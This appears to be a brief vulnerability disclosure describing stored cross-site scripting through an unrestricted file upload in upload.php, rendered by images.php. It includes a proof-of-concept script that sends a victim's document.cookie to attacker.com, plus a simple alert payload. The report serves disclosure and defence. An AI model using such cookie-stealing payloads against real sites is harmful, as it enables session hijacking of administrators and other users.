# Description

Stored XSS via Unrestricted File Upload  

- **Type:** Stored Cross-Site Scripting (XSS)  
- **Location:** `upload.php` → `images.php?id=<id>`  
- **Severity:** Low (Scoped to authenticated users)  
- **Impact:** JavaScript execution in authenticated sessions  

This allows an attacker to upload files like:  

```html
<script>alert(document.cookie)</script>
```
and have them rendered by images.php?id=<id>, where the file is served as HTML.  

The only restriction is that the XSS payload is accessible only by authenticated users with a valid JWT or session. This still presents a serious issue if a victim is an admin, a staff user or another privileged role.  


# PoC

Send POST /upload.php with malicious HTML/JS file inside.

> <script> fetch=('http://attacker.com/?cookie='+document.cookie)</script>  

After that, if admin decides to go in given link (images.php?id=123) we will get his cookies.  

[upload](../images/file_upload.gif) 

